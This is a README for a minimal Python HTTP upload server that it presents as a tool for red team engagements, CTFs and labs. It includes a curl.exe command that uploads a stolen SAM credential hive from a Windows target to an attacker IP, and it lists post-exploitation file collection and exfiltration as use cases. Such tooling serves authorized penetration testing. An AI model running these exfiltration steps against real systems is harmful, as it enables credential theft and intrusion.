# 📤m-upload [upload-server]

> Minimal HTTP file upload server for red team ops, CTFs, and lab environments.

---

## 🧬 Overview

Transferring files *to* a target machine is often more painful than it should be.

While Python makes downloading trivial:

```bash
python3 -m http.server 8000
```

Uploading usually involves:

* SMB shares
* FTP servers
* Netcat listeners
* Ad-hoc scripts

This tool removes that friction.

**`upload-server.py`** provides a **lightweight HTTP upload endpoint** with zero dependencies — designed for fast deployment during engagements.

---

## ⚙️ Features

* Minimal footprint (single file)
* Python standard library only
* Browser-based upload interface
* CLI-based upload via `curl`
* Cross-platform (Linux ↔ Windows)
* No setup / no install

---

## 🚀 Quick Start

### Start Listener (Attacker Machine)

```bash
python3 upload_server.py --port 8000
```

Optional:

```bash
python3 upload_server.py --port 8000 --dir /path/to/share
```

---

### Upload via Browser (RDP / GUI Access)

Navigate to:

```
http://<attacker-ip>:8000/
```

Upload file using the web form.

---

### Upload via Shell (Windows Target)

```powershell
curl.exe -F "file=@C:\Path\To\File" http://<attacker-ip>:8000
```

Example:

```powershell
curl.exe -F "file=@C:\Tools\SAM-2021-08-09" http://10.10.14.183:8000
```

---

## 📁 Output

Uploaded files are stored in:

```
./uploads/
```

(relative to the working directory)

---

## 🧪 Operational Use Cases

* CTF file exfiltration / staging
* Red team payload transfer
* Post-exploitation file collection
* Lab environment file sharing
* Restricted shell environments

---

## 🔐 OPSEC Considerations

This tool is intentionally **not hardened**.

* No authentication
* No encryption (HTTP only)
* No input validation guarantees
* No file size restrictions

### ⚠️ Recommendations

* Use only in **controlled environments**
* Bind to VPN / tun interfaces (e.g., `tun0`)
* Avoid exposing to public networks
* Clean up artifacts after use

---

## 🧠 Design Philosophy

* **Speed over features**
* **Simplicity over robustness**
* **Deployability over security**

The goal is to match the convenience of:

```bash
python3 -m http.server
```

…but for uploads.

---

## 🆚 Alternatives

| Method            | Complexity | Dependencies | Notes               |
| ----------------- | ---------- | ------------ | ------------------- |
| SMB Share         | Medium     | Yes          | Often blocked       |
| FTP Server        | Medium     | Yes          | Requires setup      |
| Netcat            | Low        | No           | Error-prone         |
| PowerShell        | Medium     | No           | Verbose             |
| **upload-server** | **Low**    | **No**       | **Fast & reliable** |

---

## 📌 Limitations

* Single-file uploads per request
* No TLS support
* No authentication layer
* Not suitable for production environments

---

## 📜 Disclaimer

This project is intended for:

* Educational use
* Authorized security testing
* Lab environments

**Do not use on systems you do not have permission to test.**

---

## ⭐ Final Note

A small tool that solves a common annoyance during engagements.

Keep it in your toolkit — you’ll use it more than you expect.

